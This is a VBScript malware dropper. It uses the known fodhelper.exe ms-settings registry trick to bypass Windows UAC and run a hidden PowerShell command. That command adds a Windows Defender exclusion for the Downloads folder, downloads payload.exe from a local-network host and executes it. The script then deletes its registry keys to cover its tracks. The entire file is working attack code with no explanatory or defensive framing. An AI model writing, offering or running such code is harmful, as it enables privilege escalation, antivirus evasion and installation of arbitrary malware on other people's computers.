' === UAC Bypass + Defender Exclusion + Payload Download + Execution ===
Set shell = CreateObject("WScript.Shell")

' PowerShell payload:
' 1. Add Defender exclusion
' 2. Download executable
' 3. Run executable
psCommand = "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '$env:USERPROFILE\Downloads';" & _
    "Invoke-WebRequest 'http://192.168.0.111/payload.exe' -OutFile '$env:USERPROFILE\Downloads\payload.exe';" & _
    "Start-Process '$env:USERPROFILE\Downloads\payload.exe'""""

' Write UAC bypass registry keys
shell.RegWrite "HKCU\Software\Classes\ms-settings\Shell\Open\command\", psCommand, "REG_SZ"
shell.RegWrite "HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute", "", "REG_SZ"

' Trigger UAC bypass via auto-elevated fodhelper.exe
CreateObject("WScript.Shell").Run "fodhelper.exe", 0, False

' Give PowerShell time to elevate and run
WScript.Sleep 5000

' Cleanup: Remove registry keys to reduce footprint
On Error Resume Next
shell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute"
shell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\Open\command\"
shell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\Open\"
shell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\"
shell.RegDelete "HKCU\Software\Classes\ms-settings\"
